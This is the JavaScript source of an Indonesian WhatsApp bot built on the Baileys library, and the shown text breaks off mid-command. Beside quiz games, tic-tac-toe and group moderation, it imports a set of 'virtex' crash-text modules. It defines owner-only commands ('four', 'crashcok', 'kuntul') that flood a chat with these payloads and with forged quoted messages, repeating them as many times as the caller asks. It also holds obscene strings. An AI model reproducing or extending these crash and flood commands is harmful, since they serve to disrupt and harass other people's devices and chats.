/**
   * Create By THE JO BOT
   * Base By Dika
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const { buttonvirus } = require('./virtex/buttonvirus')
const { buttonfour } = require('./virtex/buttonfour')
const { virusv1 } = require('./virtex/virusv1')
const { virusv3 } = require('./virtex/virusv3')
const { iphone } = require('./virtex/iphone')
const { philips } = require('./virtex/philips')
const { kanjut } = require('./virtex/kanjut')
const { doctext } = require('./virtex/doctext')
const { bugweb } = require('./virtex/bugweb')
const { ngazap } = require('./virtex/ngazap')
const { doc } = require('./virtex/doc')
const { four } = require('./virtex/four')
const { jobot } = require('./virtex/jobot')
const { jobot2 } = require('./virtex/jobot2')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')

// tes simi


// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []
const banned = JSON.parse(fs.readFileSync('./lib/banned.json'))
const { color, bgcolor } = require('./lib/color')
module.exports = hisoka = async (hisoka, m, chatUpdate, store) => {

hisoka.readMessages([m.key])
 
    try {
    //console.log(nomerOwner)
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const isGroup = body.endsWith('@g.us')
        const sender = isGroup ? mek.participant : mek.key.remoteJid
        const senderNumber = sender.split("@")[0] 
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await hisoka.decodeJid(hisoka.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const isBan = banned.includes(m.sender)
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const from = mek.key.remoteJid
	
        // Group
        const groupMetadata = m.isGroup ? await hisoka.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const welcm = m.isGroup ? wlcm.includes(from) : true
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
autorespon = true
const autoread = false
if(autoread) 
hisoka.readMessage(m.ke)
//=================================================//
// Fake Next Projext
 const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`© ${ownername}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `© ${ownername}`, 'jpegThumbnail': thumb}}}
const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
//=================================================//
  // Random Image Simple Menu
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
// Reply Kalau Mau Pake Tinggal Ubah aja m.reply Ke m.reply = replace aja semua 
/*const m.reply = (teks) => {
hisoka.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumb,"sourceUrl": `${myweb}`}}}, { quoted: m })
}   */
//=================================================//
// Kontak
 const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
const bacito = (jid, text, quoted = fkontak) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })
//=================================================//
//GCLINK
const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `© ${ownername}`, 'jpegThumbnail': thumb}}}
const bacit = (jid, text, quoted = fgclink) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })
//=================================================//
//Document
const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
const bacot = (jid, text, quoted = fdoc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })
//=================================================//
// VN 
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const thejo = (jid, text, quoted = fvn) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })
//=================================================//
//Lokasi
const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: thumb}}}
const thejobot = (jid, text, quoted = floc) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })
//=================================================//
//Troli
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "6289523258649-1604595598@g.us"}, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: thumb, surface: 200, message: `© ${ownername}`, orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const review = (jid, text, quoted = ftroli) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })
//=================================================//
//image
const ctlg = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", "remoteJid": "0@s.whatsapp.net"},"message": { "orderMessage": { "itemCount": 0, "surface": 'CATALOG' }}}
const reply = (jid, text, quoted = ctlg) => hisoka.sendMessage(jid, { text: text, contextInfo: { forwardingScore: 999, isForwarded: true,externalAdReply: {title: `THE JO BOT ${ngazap(prefix)}`, previewType:"PHOTO", thumbnail:fs.readFileSync('./pict.jpg'), sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w` }}}, { quoted })

//=================================================//
// Time & Date
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const qtod = m.quoted? "true":"false"

	
	try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
            }
		
	    let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0
		if (!('autobio' in setting)) setting.autobio = false
		if (!('templateImage' in setting)) setting.templateImage = true
		if (!('templateVideo' in setting)) setting.templateVideo = false
		if (!('templateGif' in setting)) setting.templateGif = false
		if (!('templateMsg' in setting)) setting.templateMsg = false	
	    } else global.db.data.settings[botNumber] = {
		status: 0,
		autobio: false,
		templateImage: true,
		templateVideo: false,
		templateGif: false,
		templateMsg: false,
	    }
	    
        } catch (err) {
            console.error(err)
        }
	    
        // Public & Self
        if (!hisoka.public) {
            if (!m.key.fromMe) return
        }

        ///console bukan kontol
//console bukan kontol
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', time, chalk.
green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }

	// reset limit every 12 hours
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	// auto set bio
	if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await hisoka.setStatus(`${hisoka.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}
	    
	  // Anti Link
        if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, maaf kamu akan di kick !`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await hisoka.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        hisoka.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        }
        
      // Mute Chat
      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
      return
      }

        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: hisoka.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, hisoka.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        hisoka.ev.emit('messages.upsert', msg)
        }
	    
	if (('family100'+m.chat in _family100) && isCmd) {
            kuis = true
            let room = _family100['family100'+m.chat]
            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
            if (!isSurender) {
                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
                if (room.terjawab[index]) return !0
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
            let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
            hisoka.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
            if (isWin || isSurender) delete _family100['family100'+m.chat]
        }

        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklagu[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklagu[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakgambar[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakgambar[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkata[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkata[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = caklontong[m.sender.split('@')[0]]
	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete caklontong[m.sender.split('@')[0]]
		delete caklontong_desk[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebakkalimat[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebakkalimat[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }

        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaklirik[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaklirik[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
	    
	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
            kuis = true
            jawaban = tebaktebakan[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, hisoka.user.name, m)
                delete tebaktebakan[m.sender.split('@')[0]]
            } else m.reply('*Jawaban Salah!*')
        }
        
        //TicTacToe
	    this.game = this.game ? this.game : {}
	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
	    hisoka.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    hisoka.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) hisoka.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) hisoka.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    hisoka.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /gunting/i
	    let b = /batu/i
	    let k = /kertas/i
	    let reg = /^(gunting|batu|kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih2) hisoka.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
	    if (!roof.pilih) hisoka.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    hisoka.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    }
	    
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`

Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya THE JO BOT${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
	    
        switch(command) {
	    case 'yuhu': {
	            if (!isCreator) return
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                m.reply(`${m.pushName} My Name THE JO BOT${text ? ': ' + text : ''}`)
            }
            break
case 'hihi': {
if (!isCreator) return
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`Hello Saya ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
  case 'four':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
let pek = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `kontol`, 
"jpegThumbnail": thumb
} 
} 
}
hisoka.sendText(m.chat, `🇹 🇭 🇪 🇫 🇴 🇺 🇷`, text, {quoted: pek})
}
}
break
 case 'crashcok':{
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kontolu = '``🔥 THE JO BOT 🔥``',
hisoka.sendMessage(m.chat, {text: kontolu, thumbnail: thumb, quoted: m, contextInfo: { externalAdReply:{title: `${jobot}`,body: '🔥 THE JO BOT 🔥',previewType:"PHOTO",thumbnail: thumb,sourceUrl:`https://xnxx.com`}}})
}
}
break
case 'kuntul': {
if (!isCreator) return
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Hallo Aku JO`
for (let i = 0; i < jumlah; i++) {
